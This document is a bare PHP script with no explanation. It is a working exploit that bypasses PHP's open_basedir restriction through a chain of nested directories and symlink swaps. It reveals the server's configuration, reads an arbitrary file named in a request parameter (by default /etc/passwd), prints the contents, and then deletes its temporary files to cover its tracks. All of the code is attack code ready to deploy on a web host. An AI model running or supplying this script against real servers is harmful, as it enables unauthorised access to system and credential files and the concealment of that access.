<?php 
header('content-type: text/plain'); 
error_reporting(-1); 
ini_set('display_errors', TRUE); 
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion()); 
printf("disable_functions: %s\n", ini_get('disable_functions')); 
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd'); 
$relat_file = getRelativePath(__FILE__, $file); 
$paths = explode('/', $file); 
$name = mt_rand() % 999; 
$exp = getRandStr(); 
mkdir($name); 
chdir($name); 
for($i = 1 ; $i < count($paths) - 1 ; $i++){ 
  mkdir($paths[$i]); 
  chdir($paths[$i]); 
} 
mkdir($paths[$i]); 
for ($i -= 1; $i > 0; $i--) { 
  chdir('..'); 
} 
$paths = explode('/', $relat_file); 
$j = 0; 
for ($i = 0; $paths[$i] == '..'; $i++) { 
  mkdir($name); 
  chdir($name); 
  $j++; 
} 
for ($i = 0; $i <= $j; $i++) { 
  chdir('..'); 
} 
$tmp = array_fill(0, $j + 1, $name); 
symlink(implode('/', $tmp), 'tmplink'); 
$tmp = array_fill(0, $j, '..'); 
symlink('tmplink/' . implode('/', $tmp) . $file, $exp); 
unlink('tmplink'); 
mkdir('tmplink'); 
delfile($name); 
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}"; 
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}"; 
echo "\n-----------------content---------------\n\n"; 
echo file_get_contents($exp); 
delfile('tmplink'); 

function getRelativePath($from, $to) { 
  // some compatibility fixes for Windows paths 
  $from = rtrim($from, '\/') . '/'; 
  $from = str_replace('\\', '/', $from); 
  $to   = str_replace('\\', '/', $to); 

  $from   = explode('/', $from); 
  $to     = explode('/', $to); 
  $relPath  = $to; 

  foreach($from as $depth => $dir) { 
    // find first non-matching dir 
    if($dir === $to[$depth]) { 
      // ignore this directory 
      array_shift($relPath); 
    } else { 
      // get number of remaining dirs to $from 
      $remaining = count($from) - $depth; 
      if($remaining > 1) { 
        // add traversals up to first matching dir 
        $padLength = (count($relPath) + $remaining - 1) * -1; 
        $relPath = array_pad($relPath, $padLength, '..'); 
        break; 
      } else { 
        $relPath[0] = './' . $relPath[0]; 
      } 
    } 
  } 
  return implode('/', $relPath); 
} 

function delfile($deldir){ 
  if (@is_file($deldir)) { 
    @chmod($deldir,0777); 
    return @unlink($deldir); 
  }else if(@is_dir($deldir)){ 
    if(($mydir = @opendir($deldir)) == NULL) return false; 
    while(false !== ($file = @readdir($mydir))) 
    { 
      $name = File_Str($deldir.'/'.$file); 
      if(($file!='.') && ($file!='..')){delfile($name);} 
    } 
    @closedir($mydir); 
    @chmod($deldir,0777); 
    return @rmdir($deldir) ? true : false; 
  } 
} 

function File_Str($string) 
{ 
  return str_replace('//','/',str_replace('\\','/',$string)); 
} 

function getRandStr($length = 6) { 
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
  $randStr = ''; 
  for ($i = 0; $i < $length; $i++) { 
    $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); 
  } 
  return $randStr; 
}